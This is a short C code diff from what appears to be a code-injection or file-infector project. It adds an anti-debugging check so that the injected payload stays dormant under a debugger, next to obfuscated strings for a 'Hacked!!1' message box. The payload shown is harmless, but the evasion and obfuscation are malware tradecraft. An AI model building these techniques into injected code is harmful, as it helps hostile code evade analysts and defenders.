@@ -14,6 +14,16 @@ extern CONST DWORD signature;
 EXTERN_C_END
 
 __declspec(code_seg("injected")) VOID inj_code_c() {
+#ifndef NO_ANTIDBG
+    if (being_debugged()) {
+        // If we're being debugged, do not run the payload, just run the program normally
+        // __debugbreak();
+        // __fastfail(FAST_FAIL_FATAL_APP_EXIT);
+        // ((PVOID(*)())NULL)();
+        return;
+    }
+#endif  // NO_ANTIDBG
+
     // Declare obfuscated strings for the rest of the function
     DECLARE_OBFUSCATED(user32, "USER32.DLL");       // DLL to load for MessageBoxA
     DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");       // MessageBoxA title
